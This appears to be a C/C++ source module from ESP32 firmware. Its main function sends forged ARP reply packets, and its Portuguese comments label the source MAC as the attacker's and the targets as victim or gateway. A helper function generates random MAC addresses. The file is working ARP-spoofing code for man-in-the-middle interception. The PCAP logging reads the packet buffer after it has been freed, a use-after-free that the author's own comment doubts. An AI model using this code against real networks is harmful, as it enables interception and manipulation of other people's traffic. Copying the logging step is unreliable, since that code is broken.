#include "modules/ethernet/eth_arp_utils.h"
#if !defined(LITE_VERSION)
#include "lwip/pbuf.h"
#include "lwipopts.h"
#include <esp_wifi.h>
#include <globals.h>
#include <lwip/etharp.h>
#include <lwip/ip_addr.h>
#include <lwip/mem.h>
#include <lwip/memp.h>
#include <lwip/netif.h>
#include <netif/ethernet.h>

// Function provided by @Fl1p, thank you brother!
// Função para enviar pacotes ARP falsificados
void sendARPPacket(
    uint8_t *targetIP,
    uint8_t *targetMAC,
    uint8_t *spoofedIP,
    uint8_t *spoofedMAC,
    File pcapFile,
    const char *sentLogMsg
) {
    struct eth_hdr *ethhdr;
    struct etharp_hdr *arphdr;
    struct pbuf *p;
    struct netif *netif;

    // Obter interface de rede
    netif = netif_list;
    if (netif == NULL) {
        Serial.println("Nenhuma interface de rede encontrada!");
        return;
    }

    // Alocar pbuf para o pacote ARP
    p = pbuf_alloc(PBUF_RAW, sizeof(struct eth_hdr) + sizeof(struct etharp_hdr), PBUF_RAM);
    if (p == NULL) {
        Serial.println("Falha ao alocar pbuf!");
        return;
    }

    ethhdr = (struct eth_hdr *)p->payload;
    arphdr = (struct etharp_hdr *)((u8_t *)p->payload + SIZEOF_ETH_HDR);

    // Preencher cabeçalho Ethernet
    MEMCPY(&ethhdr->dest, targetMAC, ETH_HWADDR_LEN); // MAC do alvo (vítima ou gateway)
    MEMCPY(&ethhdr->src, spoofedMAC, ETH_HWADDR_LEN); // MAC do atacante (nosso)
    ethhdr->type = PP_HTONS(ETHTYPE_ARP);

    // Preencher cabeçalho ARP
    arphdr->hwtype = PP_HTONS(1); // 1 é o código para Ethernet no campo hardware type (hwtype)
    arphdr->proto = PP_HTONS(ETHTYPE_IP);
    arphdr->hwlen = ETH_HWADDR_LEN;
    arphdr->protolen = sizeof(ip4_addr_t);
    arphdr->opcode = PP_HTONS(ARP_REPLY);

    MEMCPY(&arphdr->shwaddr, spoofedMAC, ETH_HWADDR_LEN);    // MAC falsificado (gateway ou vítima)
    MEMCPY(&arphdr->sipaddr, spoofedIP, sizeof(ip4_addr_t)); // IP falsificado (gateway ou vítima)
    MEMCPY(&arphdr->dhwaddr, targetMAC, ETH_HWADDR_LEN);     // MAC real do alvo (vítima ou gateway)
    MEMCPY(&arphdr->dipaddr, targetIP, sizeof(ip4_addr_t));  // IP real do alvo (vítima ou gateway)

    // Enviar o pacote
    netif->linkoutput(netif, p);
    pbuf_free(p);
    Serial.println(sentLogMsg);

    // Capturar o pacote no arquivo PCAP
    if (pcapFile) {
        pcapFile.write((const uint8_t *)p->payload, p->tot_len); // don't know if it will work
        pcapFile.flush();
    }
}

void randomizeMac(uint8_t *mac) {
    for (int i = 0; i < 6; i++) { mac[i] = random() % 256; }
}
#endif
